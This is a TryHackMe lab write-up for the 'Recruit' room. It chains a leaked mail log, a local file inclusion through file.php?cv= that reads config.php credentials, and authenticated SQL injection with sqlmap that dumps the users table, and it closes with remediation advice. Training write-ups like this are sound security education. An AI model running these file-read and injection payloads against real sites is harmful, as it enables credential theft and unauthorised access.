# Recruit — TryHackMe Writeup

> **Room:** [Recruit](https://tryhackme.com/room/recruit) · **Difficulty:** Medium
> **Category:** Web (log leak → LFI → SQLi)
> **Author of writeup:** 0xnyx
> **Goal:** Leak the app config through an LFI for a login, then SQLi the dashboard for admin.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/recruit), **no flags or passwords are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**.

---

## Step 1 — Recon

**Do** — Scan, add the vhost, directory-brute.

```bash
nmap -sVC -T4 -Pn <TARGET>
echo "<TARGET> recruit.thm" | sudo tee -a /etc/hosts
feroxbuster -u http://recruit.thm -w /usr/share/wordlists/dirb/common.txt -x php
```

**You get** — A `/mail/mail.log` exposed. It leaks the **`hr` username** and a hint that the HR password sits in the app's **config file**.

**Why / what next** — We know the username and where the password lives. We need a way to read `config.php` → look for file-read primitives. Port 53 DNS here is a rabbit hole; ignore it.

---

## Step 2 — LFI → read config.php

**Do** — A `file.php?cv=` parameter loads files. Use the `file://` wrapper / traversal to read the config.

```bash
curl "http://recruit.thm/file.php?cv=file:///var/www/html/config.php"
# or: ...?cv=../../../../var/www/html/config.php
```

**You get** — `config.php` contents → the **hr password**.

**Why / what next** — Log in as **hr** → the dashboard holds the **normal-user flag**.

---

## Step 3 — SQLi → admin

**Do** — The dashboard has a `search` parameter. Point sqlmap at it (authenticated with the hr cookie).

```bash
sqlmap -u "http://recruit.thm/dashboard.php?search=x" \
  --cookie="PHPSESSID=<hr-session>" --batch -D recruit_db -T users --dump
```

**You get** — The `users` table from `recruit_db` → **admin credentials**.

**Why / what next** — Log in as admin → **admin flag**.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | `/mail/mail.log` leak | hr username + "password in config" hint |
| 2 | LFI `file.php?cv=` → config.php | hr password (normal-user flag) |
| 3 | SQLi `dashboard.php?search=` | admin creds (admin flag) |

## Lessons

- Exposed **log files** are a recurring foothold — they name users and point at secrets.
- An LFI that reads `config.php` hands you DB/app credentials directly.
- Authenticated SQLi: pass the session cookie to sqlmap so it reaches the vulnerable page.
- Not every open port matters — port 53 was a deliberate time-sink.

## Remediation

- Don't expose logs in the web root.
- Whitelist/validate the `cv` parameter; never pass user input to file reads.
- Parameterise the dashboard search query.

---

*Write-up for [TryHackMe — Recruit](https://tryhackme.com/room/recruit).*
